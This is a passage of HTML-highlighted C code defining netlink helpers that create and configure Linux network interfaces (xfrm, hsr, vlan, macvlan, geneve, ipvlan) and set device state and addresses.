<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_xfrm</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">netlink_add_device_impl</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;xfrm&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_INFO_DATA</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">if_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">if_id</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">if_id</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_hsr</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span>
<span class="w">                            </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">slave1</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">slave2</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">netlink_add_device_impl</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;hsr&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_INFO_DATA</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ifindex1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">slave1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_HSR_SLAVE1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ifindex1</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ifindex1</span><span class="p">));</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ifindex2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">slave2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_HSR_SLAVE2</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ifindex2</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ifindex2</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_linked</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">type</span><span class="p">,</span>
<span class="w">                               </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">link</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">netlink_add_device_impl</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ifindex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">link</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_LINK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ifindex</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ifindex</span><span class="p">));</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_vlan</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span>
<span class="w">                             </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">link</span><span class="p">,</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">proto</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">netlink_add_device_impl</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;vlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_INFO_DATA</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_VLAN_ID</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">id</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_VLAN_PROTOCOL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">proto</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">proto</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ifindex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">link</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_LINK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ifindex</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ifindex</span><span class="p">));</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_macvlan</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span>
<span class="w">                                </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">link</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">netlink_add_device_impl</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;macvlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_INFO_DATA</span><span class="p">);</span>
<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MACVLAN_MODE_BRIDGE</span><span class="p">;</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_MACVLAN_MODE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">mode</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ifindex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">link</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_LINK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ifindex</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ifindex</span><span class="p">));</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_geneve</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span>
<span class="w">                               </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">vni</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">in_addr</span><span class="o">*</span><span class="w"> </span><span class="n">addr4</span><span class="p">,</span>
<span class="w">                               </span><span class="k">struct</span><span class="w"> </span><span class="nc">in6_addr</span><span class="o">*</span><span class="w"> </span><span class="n">addr6</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">netlink_add_device_impl</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;geneve&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_INFO_DATA</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_GENEVE_ID</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">vni</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">vni</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">addr4</span><span class="p">)</span>
<span class="w">    </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_GENEVE_REMOTE</span><span class="p">,</span><span class="w"> </span><span class="n">addr4</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">addr4</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">addr6</span><span class="p">)</span>
<span class="w">    </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_GENEVE_REMOTE6</span><span class="p">,</span><span class="w"> </span><span class="n">addr6</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">addr6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="cp">#define IFLA_IPVLAN_FLAGS 2</span>
<span class="cp">#define IPVLAN_MODE_L3S 2</span>
<span class="cp">#undef IPVLAN_F_VEPA</span>
<span class="cp">#define IPVLAN_F_VEPA 2</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_add_ipvlan</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span>
<span class="w">                               </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">link</span><span class="p">,</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="kt">uint16_t</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">netlink_add_device_impl</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ipvlan&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="nb">false</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_INFO_DATA</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_IPVLAN_MODE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">mode</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">mode</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_IPVLAN_FLAGS</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">flags</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">flags</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">ifindex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">link</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_LINK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ifindex</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ifindex</span><span class="p">));</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">netlink_device_change</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span>
<span class="w">                                  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">up</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">master</span><span class="p">,</span>
<span class="w">                                  </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">mac</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">macsize</span><span class="p">,</span>
<span class="w">                                  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">new_name</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">ifinfomsg</span><span class="w"> </span><span class="n">hdr</span><span class="p">;</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hdr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hdr</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">up</span><span class="p">)</span>
<span class="w">    </span><span class="n">hdr</span><span class="p">.</span><span class="n">ifi_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hdr</span><span class="p">.</span><span class="n">ifi_change</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IFF_UP</span><span class="p">;</span>
<span class="w">  </span><span class="n">hdr</span><span class="p">.</span><span class="n">ifi_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_init</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">RTM_NEWLINK</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hdr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hdr</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">new_name</span><span class="p">)</span>
<span class="w">    </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_IFNAME</span><span class="p">,</span><span class="w"> </span><span class="n">new_name</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">new_name</span><span class="p">));</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">master</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">ifindex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">if_nametoindex</span><span class="p">(</span><span class="n">master</span><span class="p">);</span>
<span class="w">    </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_MASTER</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ifindex</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ifindex</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">macsize</span><span class="p">)</span>
<span class="w">    </span><span class="n">netlink_attr</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">IFLA_ADDRESS</span><span class="p">,</span><span class="w"> </span><span class="n">mac</span><span class="p">,</span><span class="w"> </span><span class="n">macsize</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_add_addr</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">nlmsg</span><span class="o">*</span><span class="w"> </span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span>
<span class="w">                            </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="o">*</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">addrsize</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">ifaddrmsg</span><span class="w"> </span><span class="n">hdr</span><span class="p">;</span>
<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hdr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">hdr</span><span class="p">.</span><span class="n">ifa_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addrsize</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">AF_INET</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">AF_INET6</span><span class="p">;</span>
<span class="w">  </span><span class="n">hdr</span><span class="p">.</span><span class="n">ifa_prefixlen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addrsize</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">120</span><span class="p">;</span>
<span class="w">  </span><span class="n">hdr</span><span class="p">.</span><span class="n">ifa_scope</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RT_SCOPE_UNIVERSE</span><span class="p">;</span>
